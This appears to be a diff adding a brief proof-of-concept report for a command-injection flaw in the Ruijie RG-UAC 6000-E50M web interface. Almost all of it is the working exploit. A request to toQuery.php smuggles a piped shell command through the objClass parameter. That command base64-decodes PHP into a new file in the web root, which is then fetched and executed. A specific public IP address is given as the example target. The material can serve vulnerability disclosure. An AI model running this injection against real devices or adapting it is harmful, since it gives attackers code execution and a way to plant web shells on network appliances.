@@ -1,1 +1,13 @@
+锐捷网络 https://www.ruijie.com.cn/
+
+product：RG-UAC 6000-E50M
+
+for example: https://36.7.149.195:9091/
+
+visit "https://36.7.149.195:9091/view/Behavior/toQuery.php? 
+method=getList&objClass=objClass=1|echo+PD9waHAgZWNobyAiOWRhYTM1ZGFjOTYyZmIwOCI7Pz4=+|base64+-d+>/var/www/reporter/view/Behavior/9daa35dac962fb08.php+|grep"
+
+and,visit "https://36.7.149.195:9091/view/Behavior/9daa35dac962fb08.php"
+
+The file has been written to the directory and the PHP code has been executed
 
